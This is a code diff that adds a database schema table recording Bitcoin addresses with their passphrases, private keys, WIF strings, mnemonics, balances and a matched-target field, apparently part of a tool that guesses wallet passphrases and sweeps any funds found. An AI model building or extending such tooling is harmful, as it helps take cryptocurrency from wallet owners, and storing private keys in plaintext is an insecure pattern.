@@ -371,6 +371,37 @@ export const vocabularyObservations = pgTable("vocabulary_observations", {
 export type VocabularyObservation = typeof vocabularyObservations.$inferSelect;
 export type InsertVocabularyObservation = typeof vocabularyObservations.$inferInsert;
 
+// Verified addresses: Full address details with complete recovery data
+export const verifiedAddresses = pgTable("verified_addresses", {
+  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
+  address: varchar("address", { length: 62 }).notNull(),
+  passphrase: text("passphrase").notNull(),
+  wif: text("wif").notNull(),
+  privateKeyHex: text("private_key_hex").notNull(),
+  publicKeyHex: text("public_key_hex").notNull(),
+  publicKeyCompressed: text("public_key_compressed").notNull(),
+  isCompressed: boolean("is_compressed").default(true),
+  addressType: varchar("address_type", { length: 20 }),
+  mnemonic: text("mnemonic"),
+  derivationPath: varchar("derivation_path", { length: 64 }),
+  balanceSats: bigint("balance_sats", { mode: "number" }).default(0),
+  balanceBtc: varchar("balance_btc", { length: 20 }).default("0.00000000"),
+  txCount: integer("tx_count").default(0),
+  hasBalance: boolean("has_balance").default(false),
+  hasTransactions: boolean("has_transactions").default(false),
+  firstSeen: timestamp("first_seen").defaultNow(),
+  lastChecked: timestamp("last_checked"),
+  matchedTarget: varchar("matched_target", { length: 62 }),
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow(),
+}, (table) => [
+  uniqueIndex("idx_verified_addresses_address_unique").on(table.address),
+  index("idx_verified_addresses_has_balance").on(table.hasBalance),
+]);
+
+export type VerifiedAddress = typeof verifiedAddresses.$inferSelect;
+export type InsertVerifiedAddress = typeof verifiedAddresses.$inferInsert;
+
 // ============================================================================
 // SWEEP APPROVAL AND BALANCE QUEUE TABLES
 // ============================================================================
